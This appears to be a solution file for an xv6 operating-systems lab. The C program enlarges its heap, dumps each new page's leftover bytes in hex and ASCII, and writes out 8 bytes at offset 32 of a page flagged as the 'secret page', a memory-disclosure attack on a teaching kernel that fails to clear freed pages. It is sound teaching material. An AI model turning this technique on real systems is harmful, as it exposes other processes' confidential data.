#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int main(int argc, char *argv[]) {
  char *heap_start = sbrk(0);
  printf("Heap start: 0x%p\n", heap_start);
  
  sbrk(4096 * 80);
  
  char *heap_end = sbrk(0);
  printf("Heap end: 0x%p\n", heap_end);
  printf("Total pages: %d\n", (int)((heap_end - heap_start) / 4096));
  printf("\n");
  
  int page_num = 0;
  for (char *p = heap_start; p < heap_end; p += 4096) {
    printf("=== Page %d at 0x%p ===\n", page_num, p);
    
    // Print first 32 bytes in hex (using %x, no zero-padding)
    printf("First 32 bytes (hex): ");
    for (int i = 0; i < 32; i++) {
      printf("%x ", (unsigned char)p[i]);
      if ((i + 1) % 16 == 0) printf("\n                    ");
    }
    printf("\n");
    
    // Print first 32 bytes as ASCII
    printf("First 32 bytes (ascii): ");
    for (int i = 0; i < 32; i++) {
      char c = p[i];
      if (c >= 32 && c < 127) {
        printf("%c", c);
      } else {
        printf(".");
      }
    }
    printf("\n");
    
    // Print bytes at offset 32
    printf("Bytes at offset 32 (hex): ");
    for (int i = 32; i < 40; i++) {
      printf("%x ", (unsigned char)p[i]);
    }
    printf("\n");
    
    printf("Bytes at offset 32 (ascii): ");
    for (int i = 32; i < 40; i++) {
      char c = p[i];
      if (c >= 32 && c < 127) {
        printf("%c", c);
      } else {
        printf(".");
      }
    }
    printf("\n");
    
    // Check if this looks like the secret page
    if (p[0] == 'm' && p[1] == 'y' && p[2] == ' ') {
      printf("*** POTENTIAL SECRET PAGE FOUND! ***\n");
    }
    
    printf("\n");
    page_num++;
    
    write(2, p + 32, 8);
  }
  
  exit(0);
}